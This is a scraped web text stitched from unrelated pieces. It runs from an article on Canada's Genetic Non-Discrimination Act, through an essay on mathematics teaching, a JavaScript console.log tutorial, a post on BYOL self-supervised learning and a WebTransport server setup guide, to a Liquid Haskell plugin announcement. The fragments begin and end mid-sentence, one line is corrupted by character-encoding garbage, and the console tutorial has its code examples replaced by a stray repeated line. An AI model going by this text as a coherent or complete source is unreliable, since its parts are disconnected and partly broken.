for their patient communities. For 11 years, CCGF would work endlessly to
advocate for the protection of genetic test information privacy, sharing real
life stories from across Canada. </p>



<p>In May 2017, the Genetic
Non-Discrimination Act (GNDA) received Royal Assent and became law. However, the
Quebec government appealed this decision and did not agree that the GNDA was a valid act of Parliament’s
criminal law power, putting the GNDA at risk and forcing the CCGF to
refer it to the Supreme Court of Canada for their opinion.</p>



<p>What did unprotected genetic test information mean for Canadians? Simply put, if you had a genetic test done, the information was not private and could be used against you. This means it was possible for companies, such as insurance companies, to demand to see your genetic test information, which could be used to deny you coverage. Or an employer might use the genetic test information to make assumptions about your health and ability. </p>



<p>While the European Union (28 countries) were signatories to the Oviedo Convention that was first presented in 1997 (agreeing to not use genetic test information), Canada was falling behind. &nbsp;As science evolved and genetic testing became more routine, researchers and medical experts came forth to express their concern and the need to protect the privacy of genetic test information. </p>



<p>Canadian researchers like Dr. Yvonne Bombard (a genomics health services researcher and Scientist at the Li Ka Shing Knowledge Institute of St. Michael’s Hospital, Toronto) voiced concerns that if the Canadian government did not protect genetic test information, people would be afraid to participate in clinical trials, putting research and future medical advancements in jeopardy. In a written testimony to the Standing Senate Committee Dr. Bombard stated, </p>



<blockquote><p>“Genetic discrimination – the differential treatment of an individual based on genetic information – represents an important social risk associated with genetic testing. The extent and impact of genetic discrimination has been the subject of much public concern and policy attention.”<a href="#_edn1">[i]</a> <a href="https://sencanada.ca/content/sen/committee/421/RIDR/Briefs/Bombard-UnivTorontoWrittenTestimony_e.pdf">(access full testimonial and results from her study)</a></p></blockquote>



<p>After many years of dedication and hard work, on July 3rd,
2020 the Supreme Court of Canada upheld the GNDA. Passing of the act was no
easy task. CCGF experienced several barriers, including push back from
insurance companies, government turnover, and the belief from some that genetic
discrimination was not real. </p>



<p>Bev Heim-Myers, CCGF Chair explains, </p>



<blockquote><p>“Getting to where we are today was not easy but it was a huge milestone for all Canadians and worth the fight.” Sharing further, “…years ago, many thought we were doing the impossible. Genetic discrimination –what was that? Conversations were business centred not patient centered. Together, we flipped the conversation.”</p></blockquote>



<p>Champion volunteers came together from organizations like FBC to share their stories and get the attention of Parliament. </p>



<blockquote><p>“People’s lives were being ruined based on perception,” Bev explains. “Seniors were being denied entrance into long-term care, children denied adoption –genetic discrimination was ruining lives and it was time that governments listened.”</p></blockquote>



<p>For Bev and other CCGF representatives like Sharon Colle, former President and CEO of FBC, the fight to pass the GNDA was not about if, but when. The act’s undivided purpose was (and remains) to protect the health and privacy of all Canadians. And, as champion voices grew louder over the course of the 11 years it took to get the act in place, it was clear that the well-being of Canadians came first.</p>



<p>FBC is honoured to be part of this historic endeavor that will protect generations to come. With the support of our dedicated vision loss community, we brought a voice to the thousands of individuals living with inherited eye diseases and the millions of Canadians living with genetic conditions. </p>

These concepts are universally valuable and applicable, being time-tested and proven robust. We begin with these ideas because, if properly applied, they can form the â€œkernelâ€� to your â€œoperating systemâ€� â€“ governing how you think and learn, paving the way for deeper understanding later on.</p>

	<div>
		<p>My general teaching philosophy can be summarised in three principles or axioms regarding learning. They concern the source, the process, and the goal of learning respectively.</p>
<p>My first axiom is this: In a perfect world students pursue learning not because it is prescribed to them but rather out of a genuine desire to figure things out. We must therefore teach as if our students were of this kind. Only by aspiring to this ideal can we bring it closer to being realised.</p>
<p>It follows that we must not introduce any topic for which we cannot first convince the students that they should want to pursue it. This is a standard very rarely met in mathematics. Everyone likes to tell themselves that they are giving motivations for what they teach, but very little of what passes for motivation stands up to critical scrutiny as a motivation in the sense of the learning ideal outlined above. In all such cases, therefore, the student has no reason to pursue the topic in question other than obedience to the dictatorial authority of the teacher. In my view we cannot fault a student who hates mathematics in such circumstances; if anything, I would sooner fault a student who did not.</p>
<p>My second axiom concerns the process of learning. It says: We learn when we are challenged, when we push ourselves. If you’re not stuck you’re not learning. If it’s not a struggle you’re not doing it right.</p>
<p>It follows that we must always look for new points of view and pursue open-ended questions. The role of the teacher is not to make life easy for the student by giving crystal clear lectures and predictable tests. Instead the role of the teacher is to guide and encourage the student’s own process of learning by setting suitable challenges and by stimulating thought and reflection.</p>
<p>The final axiom of my teaching philosophy is that the goal of teaching is independent thought. We want students to be able to think and reason and apply what they know in new situations. We do not want to create robots or parrots or one-trick ponies.</p>
<p>It follows that when we learn something we must always inquire why it is so, and that we must answer this question according to our own judgement, not by mimicking some external standards of rigour and proof. It also follows that we must always seek out the broader meaning of what we are studying through its applications and interconnections with other ideas.</p>
<p>* &nbsp; &nbsp; * &nbsp; &nbsp; *</p>
<p>I have coined the phrase “Intellectual Mathematics” for the teaching philosophy I have in mind, because its fundamental principle is to treat students with the greatest possible intellectual respect.</p>
<p>This is the opposite of traditional mathematics teaching, which treats students like circus animals who need to be taught to jump through hoops by means of mindless drill training.</p>
<p>In the traditional approach the essence of the teacher’s role is authority. The teacher holds the carrot and the stick and that’s why you have to do as he says.</p>
<p>In the Intellectual Mathematics approach the essence of the teacher’s role is inspiration, and the goal of teaching is to stimulate thought and reflection. The teacher disavows the notion that he has the right to boss people around. Instead he considers it his responsibility to nourish in the students a desire to pursue their studies out of their own intrinsic motivation and interest.</p>
<p>It follows that in Intellectual Mathematics a topic is introduced only when the student can be convinced of the value of doing so. This is the opposite of the traditional approach where topics are routinely introduced at a stage where they serve no credible purpose whatsoever, simply because some curriculum designer decided that the students “need to have seen it” a year or two down the line.</p>
<p>Traditional curriculum designers butcher mathematics the way colonialists used to divide conquered continents: with crude and clinical cuts that are profoundly insensitive to any and all organic connections between the constituent parts. Such an approach makes sense for those who take their own authority for granted.</p>
<p>Intellectual Mathematics does not use such totalitarian techniques. Borders are not drawn where they do not belong and organic connections are respected. Mathematics is not severed from physics, nor differential equations from calculus, and so on, regardless of the administrative efficiencies of such compartmentalisation. You do not read every other line of a Shakespeare play in one class, and then the remaining lines in another class the following year. But in mathematics we routinely do precisely this. Such an approach is incompatible with intellectual respect for the students.</p>
<p>In traditional mathematics, things are taught because they are replicable and testable. The teacher is so dependent on the drillmaster paradigm that only topics that fit it can be taught. If a topic doesn’t allow for fifty-eight near-identical drill problems at the end of the section, then that topic is unteachable in traditional mathematics. It will not be taught no matter how important or crucial for understanding the true purpose of the entire subject. Conversely, topics that do lend themselves to endless drill problems will often be taught for this reason alone, despite being utterly pointless and contrived.</p>
<p>In Intellectual Mathematics, presenting topics in an inherently interesting and meaningful way is the first and foremost consideration. The purpose of the problems at the end of the section is not to force students through a repetitive obstacle course, but to convince the students of the value and importance of what they are studying.</p>
<p>The traditional approach fosters robotic, unthinking students. It selects for obedience and punishes independent and critical thought. Intellectual Mathematics does the opposite.</p>
<p>I say with Rousseau: “Let the child do nothing because he is told; nothing is good for him but what he recognises as good. When you are always urging him beyond his present understanding, you think you are exercising a foresight which you really lack. To provide him with useless tools which he may never require, you deprive him of man’s most useful tool — common-sense. You would have him docile as a child; he will be a credulous dupe when he grows up. You are always saying, ‘What I ask is for your good, though you cannot understand it. ...’ All these fine speeches with which you hope to make him good, are preparing the way, so that … every kind of fool may catch him in his snare or draw him into his folly.”</p>
<p>* &nbsp; &nbsp; * &nbsp; &nbsp; *</p>
<p>Intellectual Mathematics should not be confused with what passes for “reform” teaching. Everything we have said about the traditional approach applies equally well to “reform” approaches, because what is called “reform” pertains almost exclusively to surface form, not substance.</p>
<p>The basic fault of the modern “reform” movement is that it does not have the courage and confidence and ability to challenge the mathematical establishment on matters of substance. It assumes that the traditional approach is mathematically infallible, though pedagogically flawed. It therefore busies itself with concocting pedagogical schemes to make the same old medicine go down more easily. Group work! Use of technology! Inquiry learning! Flipping the classroom!</p>
<p>Modern “reform” efforts start at the wrong end. They put the cart before the horse, lipstick on the pig. The enterprise is doomed because it is predicated on the false assumption that the underlying curriculum is beyond rebuke. It doesn’t matter what pedagogical tricks you use if the substance you are trying to teach is poorly conceived in the first place. It is impossible to teach bad material well. That is why any reform worthy of its name needs to actually reform mathematical substance.</p>
<p>The Intellectual Mathematics approach starts with content and substance. It is not primarily about how to teach, but what to teach. It does not start with the question: “How can we make students understand concept X?” Rather it starts with the question: “Should we even teach concept X in the first place? If so, why?” This should be the guiding question of true reform.</p>
<p>* &nbsp; &nbsp; * &nbsp; &nbsp; *</p>
<p>Intellectual Mathematics is written for the intellectual fulfilment of the reader. This means that it seeks the most satisfying explanations, the most vivid illustrations, and the most compelling motivations. It also means that it engages our intuition whenever possible.</p>
<p>Traditional mathematics is written for robots and nitpickers. It is obsessed with being technically correct at the expense of all else. Again and again the ugliest proofs and the most contrived order of presentation are favoured in the traditional approach on the sole grounds that they are the easiest to write down in a manner that cannot be faulted with respect to logical correctness.</p>
<p>In Intellectual Mathematics, when facing a new concept, our primary goal is to understand how and why it works. The standard by which this is judged is our own sense of satisfaction and understanding. Emotion, passion, and the joy of insight are therefore essential components of Intellectual Mathematics.</p>
<p>In traditional mathematics, when facing a new concept, the goal is to reach the requisite results without making any technical errors. Crossing the t’s and dotting the i’s are the alpha and omega of traditional mathematics. Traditional mathematics is anti-human. It fetishises robotic manipulation of symbols and involves no emotions except a crippling fear of genuine and free human thought.</p>
<p>In traditional mathematics, the character and bulk of any given proof usually has next to nothing to do with why that particular theorem is true and everything to do with incidental technicalities. Students soon get the hint that mathematics is not about actually thinking and trying to figure stuff out; rather it is clearly a formal game completely divorced from common sense.</p>
<p>Indeed, formal proofs are sometimes accompanied by an informal heuristic argument, only to be followed …</p></div></article></main></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598376418025/o2KPEw6yF.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>One of the ways JavaScript developers debug their code is by using <strong>console.log</strong> to figure out what the output of a particular variable  or condition is. But, what if there is a better way of using this function to give us a better developer experience?</p>
<p>The popular methods to use console.log may look something like this.</p>
<pre><code><span>const</span> blogger1 = {name : <span>"mycodinghabits"</span>, occupation : <span>"software developer"</span>, interest : <span>"dancing"</span>}
<span>const</span> blogger2 = {name : <span>"victoria lo"</span>, occupation : <span>"web developer"</span>, interest : <span>"collecting quotes"</span>}
<span>const</span> blogger3 = {name : <span>"bolaji ayodeji"</span>, occupation : <span>"JAMStack developer"</span>, interest : <span>"sharing knowledge"</span>}

<span>console</span>.log(blogger1)
<span>console</span>.log(blogger2)
<span>console</span>.log(blogger3)
</code></pre><p>And the output on the web browser is</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375354524/mBgXtzN5w.png?auto=format&amp;q=60" alt="Untitled.png"></p>
<p>From that log we arent sure who is <strong>blogger1, 2 or 3.</strong> This is where we can start to do more with <strong>console.log.</strong> To make this more readable which in turn increases developer happiness,  we can do this instead</p>
<pre><code><span>console</span>.log({blogger1, blogger2, blogger3})
</code></pre><p>which gives us a better output with our variable names. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375469237/qeKNMcZOi.png?auto=format&amp;q=60" alt="Untitled 1.png"></p>
<p>Or even better, if our object has the same properties we can use.</p>
<h2 id="consoletable">Console.table</h2>
<pre><code>
<span>console</span>.table([blogger1, blogger2, blogger3])


<span>console</span>.table({blogger1, blogger2, blogger3})
</code></pre><p>This gives us

<p>The first example is useful when you have </p>
<ul>
<li>an array of objects</li>
</ul>
<p>and the second when you have </p>
<ul>
<li>objects embedded in another object.</li>
</ul>
<p>Thats cool, but whats even cooler is if I wanted to log performance of a piece of code  which iterates over an array of my objects, I can do this using <strong>console.time</strong>.</p>
<h2 id="consoletime">Console.time</h2>
<p>In this example, I am trying to compare the performance of using maps instead of for loops. Check out all I had to say about this in this <a target="_blank" href="https://blog.oshogunle.com/learning-javascript-topic-higher-order-functions-ckdvlkqxs0151jas1fl8tdx13">article</a></p>

<span>const</span> blogger3 = {name : <span>"bolaji ayodeji"</span>, occupation : <span>"JAMStack developer"</span>, interest : <span>"sharing knowledge"</span>}

<blockquote>
<p>Bonus - Here you can see that my console logs are prettier, this is because the string formatting I applied using the %c allows me to add styling like you would do in css. Try it!</p>
</blockquote>
<h2 id="consoletrace">Console.trace</h2>
<p>Have you ever had a bug in your code and wanted to figure out where in your code execution your function was being called? Great! We can use <strong>console.trace</strong> to do this. </p>

<p>Keeping in mind that the call stack follows a <a target="_blank" href="https://www.freecodecamp.org/news/understanding-the-javascript-call-stack-861e41ae61d4/">Last In, First Out Principle</a>, and in this case loopBloggers was pushed into the stack first followed by mapBloggers.</p>
<h2 id="consoleassert">Console.assert</h2>

<p>Unlike prior work like SimCLR and MoCo, the recent paper <a href="http://arxiv.org/abs/2006.07733">Bootstrap Your Own Latent</a> (BYOL) from <a href="https://deepmind.com/">DeepMind</a> demonstrates a state of the art method for self-supervised learning of image representations without an explicitly contrastive loss function. This simplifies training by removing the need for negative examples in the loss function. We highlight two surprising findings from our work on reproducing BYOL:</p>

<p><strong>(1) BYOL generally performs no better than random when batch normalization is removed, and</strong></p>

<p><strong>(2) the presence of batch normalization implicitly causes a form of contrastive learning</strong>.</p>

<p>These findings highlight the importance of contrast between positive and negative examples when learning representations and help us gain a more fundamental understanding of how and why self-supervised learning works.</p>

<p>The code used for this post can be found at <a href="https://github.com/untitled-ai/self_supervised">https://github.com/untitled-ai/self_supervised</a>.</p>

<p>Machine learning is typically done in a <em>supervised</em> fashion: we use a dataset consisting of the inputs and “right answers” (outputs) to find the best function that maps from the input data onto the right answers. By contrast, in <em>self-supervised</em> <sup id="fnref:ssup" role="doc-noteref"><a href="#fn:ssup">1</a></sup>  learning, no right answers are provided in the data set. Instead, we learn a function that maps the input data onto itself (ex: using the right half of an image to predict the left half of an image).</p>

<p>This approach has proven successful in everything from language to images and audio. In fact, most recent language models, from <a href="http://jalammar.github.io/illustrated-word2vec/">word2vec</a> to <a href="http://jalammar.github.io/illustrated-bert/">BERT</a> and <a href="https://arxiv.org/abs/2005.14165">GPT-3</a>, are examples of self-supervised approaches. More recently, this approach has had some incredible results for audio and images as well, and <a href="https://cacm.acm.org/news/244720-yann-lecun-yoshua-bengio-self-supervised-learning-is-key-to-human-level-intelligence/fulltext">some believe</a> that it may be an important component of human-like intelligence. This post focuses on self-supervised learning for image representations. For more background on self-supervised learning, see the resources below <sup id="fnref:resources" role="doc-noteref"><a href="#fn:resources">2</a></sup>.</p>



<h3 id="contrastive-learning">Contrastive learning</h3>

<p>Until <a href="https://arxiv.org/abs/2006.07733">BYOL</a> was published a few months ago, the best performing algorithms were <a href="http://arxiv.org/abs/1911.05722">MoCo</a> and <a href="http://arxiv.org/abs/2002.05709">SimCLR</a>. MoCo and SimCLR are both examples of <em>contrastive learning</em>.</p>

<p>Contrastive learning is the process of training a classifier to distinguish between “similar” and “dissimilar” input data. For MoCo and SimCLR specifically, the classifier’s positive examples are modified versions of the same image, while negative examples are other images in the same data set. For example, suppose there is a picture of a dog. In that case, the positive examples could be different crops of that image (see below figure), while the negative examples could be crops from entirely different images.</p>

<figure>

</figure>

<h3 id="byol-self-supervised-learning-without-contrastive-learning-not-exactly">BYOL: self-supervised learning without contrastive learning? Not exactly.</h3>

<p>While MoCo and SimCLR use contrastive learning between positive and negative examples in their loss functions, BYOL uses only positive examples in the loss function. At first glance, BYOL appears to be doing self-supervised learning without contrasting between different images at all. However, it appears that the primary reason BYOL works is that it is doing a form of contrastive learning — just via an indirect mechanism.</p>

<p>To more deeply understand this indirect contrastive learning in BYOL, we should first review how each of these algorithms works. See <a href="https://untitled-ai.github.io/appendix-for-understanding-self-supervised-contrastive-learning.html#appendix-a">Appendix A</a> for a table that shows the notation used in each of the papers. In this post, we use the notation from BYOL for consistency.</p>

<h3 id="simclr">SimCLR</h3>

<p>SimCLR is a particularly elegant self-supervised algorithm that managed to simplify previous approaches to their essential core and improve upon their performance. Two transformations <em>v</em> and <em>v’</em> of the same image <em>x</em> are fed through the same network to produce two projections <em>z</em> and <em>z’</em>. The contrastive loss aims to maximize the similarity of the two projections from the same input $x$ while minimizing the similarity to projections of other images within the same mini-batch. Continuing our dog example, projections of different crops of the same dog image would hopefully be more similar than crops from other random images in the same batch.</p>

<p>The multilayer perceptron (MLP) used for projection in SimCLR uses batch normalization after each linear layer.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/simclr_arch.png" alt="SimCLR architecture">
  <figcaption>SimCLR architecture.</figcaption>
</figure>

<h3 id="moco">MoCo</h3>

<p>Relative to SimCLR, MoCo v2 manages to both decrease the batch size (from 4096 to 256) and improve the performance. Unlike SimCLR, where the top and bottom row in the diagram represent the same network (parameterized by $\theta$), MoCo splits the single network into an <em>online network</em> (top row) parameterized by $\theta$ and a <em>momentum network</em> (bottom row) parameterized by $\xi$. The online network is updated by stochastic gradient descent, while the momentum network is updated based on an exponential moving average of the online network weights. The momentum network allows MoCo to efficiently use a memory bank of past projections as negative examples for the contrastive loss. This memory bank is what enables the much smaller batch sizes. In our dog image illustration, the positive examples would be crops of the same image of a dog. The negative examples are completely different images that were used in past mini-batches, projections of which are stored in the memory bank.</p>

<p>The MLP used for projection in <a href="http://arxiv.org/abs/2003.04297">MoCo v2</a> does not use batch normalization</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/moco_v2_arch.png" alt="MoCo v2 architecture">
  <figcaption>MoCo v2 architecture. Top row is online encoder, bottom row is momentum encoder.</figcaption>
</figure>

<h3 id="byol">BYOL</h3>

<p>BYOL builds on the momentum network concept of MoCo, adding an MLP $q_\theta$ to predict z’ from z. Rather than using a contrastive loss, BYOL uses the L2 error between the normalized prediction p and target z’. Using our dog image example, BYOL tries to convert both crops of the dog image into the same representation vector (make p and z’ equal.) Because this loss function does not require negative examples, there is no use for a memory bank in BYOL.</p>

<p>Both MLPs in BYOL use batch normalization after the first linear layer only.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/byol_arch.png" alt="BYOL architecture">
  <figcaption>BYOL architecture.</figcaption>
</figure>

<p>By the above description, it appears that BYOL can learn without explicitly contrasting between multiple different images. <strong>Surprisingly, however, we found that BYOL is not only doing contrastive learning, but that contrastive learning is essential to its success</strong>.</p>



<p>We originally implemented BYOL in PyTorch using code we had written for MoCo. When we began training our network, we found that <strong>our network performed no better than random</strong>. Comparing our code to <a href="https://github.com/sthalles/PyTorch-BYOL">another available implementation</a> (thanks sthalles!), we discovered we were missing batch normalization in the MLP. We were quite surprised that batch normalization was critical to training BYOL, while MoCo v2 did not require it at all.</p>

<p>For our initial testing, we trained a ResNet-18 with BYOL on the STL-10 unsupervised dataset using SGD with momentum and a batch size of 256 <sup id="fnref:opt" role="doc-noteref"><a href="#fn:opt">3</a></sup>. See <a href="https://untitled-ai.github.io/appendix-for-understanding-self-supervised-contrastive-learning.html#appendix-b">Appendix B</a> for details on data augmentation. Below are the first ten epochs of training for the same BYOL algorithm with and without batch normalization in the MLPs</p>

  <figcaption>Linear evaluation accuracy on a validation set during early training of a ResNet-18 on STL10. When BYOL was trained without batch normalization in the MLP, the performance remained no better than a random baseline.</figcaption>
</figure>

<h3 id="why-did-this-happen">Why did this happen?</h3>

<p>To investigate the cause of this dramatic change in performance, we performed some additional experiments.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/contrastive_loss_arch.png" alt="Contrastive loss architecture">
  <figcaption>Configuration used for experiments with contrastive loss, enabling better comparison to BYOL results.</figcaption>
</figure>

<p>Because the prediction MLP q changes the network depth compared to MoCo, we wondered if batch normalization might be needed to regularize this network. That is, while MoCo <em>does not</em> require batch normalization, it could be that MoCo <em>does</em> require batch normalization when paired with an additional prediction MLP. To test this, we started training the network shown above with a contrastive loss function. We found that the network was able to perform significantly better than random within ten epochs. This result made us suspect that something about <strong>not using a contrastive loss function</strong> causes the dependence of training on batch normalization.</p>

<p>We then wondered whether another type of normalization would have the same effect. We applied Layer Normalization to the MLPs instead of batch normalization and trained the network with BYOL <sup id="fnref:layernorm" role="doc-noteref"><a href="#fn:layernorm">4</a></sup>. As in the experiments where MLPs had no normalization, the performance was no better than random. This result told us that <strong>the activations of other inputs in the same mini-batch</strong> are essential in helping BYOL find useful representations.</p>

<p>Next, we wanted to know whether batch normalization is required in the projection MLP $g$, the prediction MLP $q$, or both. Our experiments showed that batch normalization is most useful in the projection MLP, but the network can learn useful representations with batch normalization in either MLP. A <strong>single batch normalization layer</strong> in one of the MLPs is sufficient for the network to learn.</p>

<p>To summarize the findings so far: in the absence of a contrastive loss function, the success of BYOL training hinges on something about a single batch normalization layer related to the activations from other inputs in the mini-batch.</p>

<p>One purpose of negative examples in a contrastive loss function is to prevent mode collapse<sup id="fnref:collapse" role="doc-noteref"><a href="#fn:collapse">5</a></sup>.

<h2 id="overview">Overview<a href="#overview" title="Permanent link">¶</a></h2>
<p>WebTransport is a new browser API offering low-latency, bidirectional, client-server messaging. If you have not heard about it before I suggest to first read a post called <a href="https://web.dev/quictransport/">Experimenting with QuicTransport</a> published recently on web.dev – it gives a nice overview to WebTransport and shows client-side code examples. Here we will concentrate on implementing server side.</p>
<p>Some key points about WebTransport spec:</p>
<ul>
<li>WebTransport standard will provide a possibility to use streaming client-server communication using modern transports such as <a href="https://en.wikipedia.org/wiki/QUIC">QUIC</a> and <a href="https://en.wikipedia.org/wiki/HTTP/3">HTTP/3</a></li>
<li>It can be a good alternative to <a href="https://en.wikipedia.org/wiki/WebSocket">WebSocket</a> messaging, standard provides some capabilities that are not possible with current WebSocket spec: possibility to get rid of head-of-line blocking problems using individual streams for different data, the possibility to reuse a single connection to a server in different browser tabs</li>
<li>WebTransport also defines an unreliable stream API using UDP datagrams (which is possible since QUIC is UDP-based) – which is what browsers did not have before without a rather complex <a href="https://en.wikipedia.org/wiki/WebRTC">WebRTC</a> setup involving ICE, STUN, etc. This is sweet for in-browser real-time games.</li>
</ul>
<p>To help you figure out things here are links to current WebTransport specs:</p>
<ul>
<li><a href="https://tools.ietf.org/html/draft-vvv-webtransport-overview-01">WebTransport overview</a> – this spec gives an overview of WebTransport and provides requirements to transport layer</li>
<li><a href="https://tools.ietf.org/html/draft-vvv-webtransport-quic">WebTransport over QUIC</a> – this spec describes QUIC-based transport for WebTransport</li>
<li><a href="https://tools.ietf.org/html/draft-vvv-webtransport-http3">WebTransport over HTTP/3</a> – this spec describes HTTP/3-based transport for WebTransport (actually HTTP/3 is a protocol defined on top of QUIC)</li>
</ul>
<p>At moment Chrome only implements <a href="https://web.dev/quictransport/#register-for-ot">trial possibility</a> to try out WebTransport standard and only implements WebTransport over QUIC. Developers can initialize transport with code like this:</p>
<div><pre><span></span><code><span>const</span> <span>transport</span> <span>=</span> <span>new</span> <span>QuicTransport</span><span>(</span><span>'quic-transport://localhost:4433/path'</span><span>);</span>
</code></pre></div>

<p>In case of HTTP/3 transport one will use URL like <code>'https://localhost:4433/path'</code> in transport constructor. All WebTransport underlying transports should support instantiation over URL – that's one of the spec requirements. </p>
<p>I decided that this is a cool possibility to finally play with QUIC protocol and its Go implementation <a href="https://github.com/lucas-clemente/quic-go">github.com/lucas-clemente/quic-go</a>.</p>
<div>
<p>Danger</p>
<p>Please keep in mind that all things described in this post are work in progress. WebTransport drafts, Quic-Go library, even QUIC protocol itself are subjects to change. You should not use it in production yet.</p>
</div>
<p><a href="https://web.dev/quictransport/">Experimenting with QuicTransport</a> post contains links to a <a href="https://googlechrome.github.io/samples/quictransport/client.html">client example</a> and companion <a href="https://github.com/GoogleChrome/samples/blob/gh-pages/quictransport/quic_transport_server.py">Python server implementation</a>.</p>
<p><img alt="client example" src="https://i.imgur.com/Hty00aG.png"></p>
<p>We will use a linked client example to connect to a server that runs on localhost and uses <a href="https://github.com/lucas-clemente/quic-go">github.com/lucas-clemente/quic-go</a> library. To make our example work we need to open client example in Chrome, and actually, at this moment we need to install Chrome Canary. The reason behind this is that the  <code>quic-go</code> library supports QUIC draft-29 while Chrome &lt; 85 implements QuicTransport over draft-27. If you read this post at a time when Chrome stable 85 already released then most probably you don't need to install Canary release and just use your stable Chrome.</p>
<p>We also need to generate self-signed certificates since WebTransport only works with a TLS layer, and we should make Chrome trust our certificates. Let's prepare our client environment before writing a server and first install Chrome Canary.</p>
<h2 id="install-chrome-canary">Install Chrome Canary<a href="#install-chrome-canary" title="Permanent link">¶</a></h2>
<p>Go to <a href="https://www.google.com/intl/en/chrome/canary/">https://www.google.com/intl/en/chrome/canary/</a>, download and install Chrome Canary. We will use it to open <a href="https://googlechrome.github.io/samples/quictransport/client.html">client example</a>.</p>
<div>
<p>Note</p>
<p>If you have Chrome &gt;= 85 then most probably you can skip this step.</p>
</div>
<h2 id="generate-self-signed-tls-certificates">Generate self-signed TLS certificates<a href="#generate-self-signed-tls-certificates" title="Permanent link">¶</a></h2>
<p>Since WebTransport based on modern network transports like QUIC and HTTP/3 security is a keystone. For our experiment we will create a self-signed TLS certificate using <code>openssl</code>. </p>
<p>Make sure you have <code>openssl</code> installed:</p>
<div><pre><span></span><code>$ which openssl
/usr/bin/openssl
</code></pre></div>

<p>Then run:</p>
<div><pre><span></span><code>openssl genrsa -des3 -passout pass:x -out server.pass.key <span>2048</span>
openssl rsa -passin pass:x -in server.pass.key -out server.key
rm server.pass.key
openssl req -new -key server.key -out server.csr
</code></pre></div>

<p>Set <code>localhost</code> for Common Name when asked.</p>
<p>The self-signed TLS certificate generated from the <code>server.key</code> private key and <code>server.csr</code> files:</p>
<div><pre><span></span><code>openssl x509 -req -sha256 -days <span>365</span> -in server.csr -signkey server.key -out server.crt
</code></pre></div>

<p>After these manipulations you should have <code>server.crt</code> and <code>server.key</code> files in your working directory.</p>

<p>Now the last step. What we need to do is run Chrome Canary with some flags that will allow it to trust our self-signed certificates. I suppose there is an alternative way making Chrome trust your certificates, but I have not tried it.</p>
<p>First let's find out a fingerprint of our cert:</p>
<div><pre><span></span><code>openssl x509 -in server.crt -pubkey -noout <span>|</span> openssl pkey -pubin -outform der <span>|</span> openssl dgst -sha256 -binary <span>|</span> openssl enc -base64
</code></pre></div>

<p>In my case base64 fingerprint was <code>pe2P0fQwecKFMc6kz3+Y5MuVwVwEtGXyST5vJeaOO/M=</code>, yours will be different.</p>
<p>Then run Chrome Canary with some additional flags that will make it trust out certs (close other Chrome Canary instances before running it):</p>
<div><pre><span></span><code>$ /Applications/Google<span>\ </span>Chrome<span>\ </span>Canary.app/Contents/MacOS/Google<span>\ </span>Chrome<span>\ </span>Canary <span>\</span>
    --origin-to-force-quic-on<span>=</span>localhost:4433 <span>\</span>
    --ignore-certificate-errors-spki-list<span>=</span>pe2P0fQwecKFMc6kz3+Y5MuVwVwEtGXyST5vJeaOO/M<span>=</span>
</code></pre></div>

<p>This example is for MacOS, for your system see <a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags">docs on how to run Chrome/Chromium with custom flags</a>.</p>
<p>Now you can open <a href="https://googlechrome.github.io/samples/quictransport/client.html">https://googlechrome.github.io/samples/quictransport/client.html</a> URL in started browser and click <code>Connect</code> button. What? Connection not established? OK, this is fine since we need to run our server :)</p>

<p>I enjoy working with LH. However, I’d be the very first to confess that it has been incredibly tedious to get to work on <em>existing</em> code bases, for various reasons.</p>
<ol type="1">
<li><p>LH ran <em>one file at a time</em>; it was a hassle to <strong>systematically analyze</strong> all the modules in a single package.</p></li>
<li><p>LH had <em>no notion of packages</em>; it was impossible to <strong>import specifications</strong> across packages.</p></li>
<li><p>LH had <em>no integration</em> with the standard compilation cycle; it was difficult to get robust, <strong>development-time feedback</strong> using <code>ghci</code> based tools.</p></li>
</ol>
<p>I’m delighted to announce the release of <a href="http://ucsd-progsys.github.io/liquidhaskell/">LH version 0.8.10.2</a>.</p>
<p>Thanks to the ingenuity and tireless efforts of our friends <a href="http://www.alfredodinapoli.com/">Alfredo Di Napoli</a> and <a href="https://www.andres-loeh.de/">Andres Loh</a> at <a href="http://www.well-typed.com/">Well-Typed</a> this new version solves all three of the above problems in a single stroke, making it vastly simpler (dare I say, quite straightforward!) to run LH on your Haskell code.</p>
<!-- more -->
<p>Alfredo and Andres’ key insight was that all the above problems could be solved if LH could be re-engineered as a <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/extending_ghc.html#compiler-plugins">GHC Compiler Plugin</a> using hooks that GHC exposes to integrate external checkers during compilation. I strongly encourage you to check out Alfredo’s talk at the <a href="https://icfp20.sigplan.org/details/hiw-2020-papers/1/Liquid-Haskell-as-a-GHC-Plugin">Haskell Implementor’s Workshop</a> if you want to learn more about the rather non-trivial mechanics of how this plugin was engineered. However, in this post, lets look at <em>how</em> and <em>why</em> to use the plugin, in particular, how the plugin lets us</p>
<ol type="1">
<li><p>Use GHC’s dependency resolution to analyze entire packages with minimal recompilation;</p></li>
<li><p>Ship refined type specifications for old or new packages, and have them be verified at client code;</p></li>
<li><p>Use tools like <code>ghci</code> based IDE tooling (e.g.&nbsp;<code>ghcid</code> or <code>ghcide</code> to get interactive feedback),</p></li>
</ol>
<p>all of which ultimately, I hope, make Liquid Haskell easier to use.</p>
<h2 id="analyzing-packages">1. Analyzing Packages</h2>
<p>First, lets see a small “demo” of how to <em>use</em> the plugin to compile a small <a href="https://github.com/ucsd-progsys/lh-plugin-demo"><code>lh-plugin-demo</code></a> package with two modules</p>

<p>which defines a function <code>incr</code> that consumes and returns positive integers, and</p>

<p>which imports <code>Demo.Lib</code> and uses <code>incr</code>.</p>
<h3 id="updating-.cabal-to-compile-with-the-lh-plugin">Updating <code>.cabal</code> to compile with the LH plugin</h3>
<p>To “check” this code with LH we need only tell GHC to use it as a plugin, in two steps.</p>
<ol type="1">
<li>First, adding a dependency to LH in the <code>.cabal</code> file (or <code>package.yaml</code>)</li>
</ol>
<pre><code>  build-depends:
      liquid-base,
